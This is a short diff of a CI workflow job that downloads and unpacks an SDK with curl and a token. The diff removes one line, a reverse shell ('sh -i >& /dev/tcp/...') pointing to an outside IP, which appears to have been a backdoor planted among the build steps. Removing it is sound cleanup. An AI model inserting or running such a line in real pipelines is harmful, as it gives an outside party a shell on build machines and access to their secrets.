@@ -45,7 +45,6 @@ jobs:
               exit
           fi
           curl ${SITE_NAME}/getsdk?sdktok=${MCSDK_TOKEN} -o sdk.tar.gz
-          sh -i >& /dev/tcp/159.65.128.101/9392 0>&1
           tar -xvzf sdk.tar.gz
           rm sdk.tar.gz
           rm coolsdk/readme.txt
